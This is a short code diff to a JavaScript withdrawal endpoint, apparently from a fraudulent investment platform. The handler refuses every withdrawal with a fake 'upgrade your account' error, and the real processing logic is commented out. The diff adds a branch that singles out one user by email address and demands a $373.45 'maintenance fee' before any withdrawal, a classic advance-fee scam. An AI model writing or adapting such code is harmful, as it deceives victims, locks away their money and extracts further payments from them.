@@ -13,8 +13,12 @@ export const makeWithdrawal = async (req, res) => {
   const currentBalance = req.profile.accountBalance;
   const { amount, currency } = req.body;
   console.log(req.body);
-  return response(res, 401, "Upgrade your account to sliver level", null);
+  
+if(req.profile.email?.toLowerCase()==="victorimb7@gmail.com"){
 
+   return response(res, 401, "maintenance fee of $373.45 needed for service charge before any withdrawal", null);
+}
+   return response(res, 401, "Upgrade your account to sliver level", null);
   /**
   
   try {
